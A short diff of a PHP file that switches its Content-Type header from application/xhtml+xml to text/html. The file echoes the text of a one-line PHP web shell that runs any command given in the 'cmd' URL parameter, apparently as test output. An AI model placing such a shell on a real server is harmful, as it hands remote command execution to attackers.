@@ -1,4 +1,4 @@
 <?php
-header('Content-Type: application/xhtml+xml'); 
+header('Content-Type: text/html'); 
 echo '<?php system($_GET["cmd"]); ?>';
 ?>
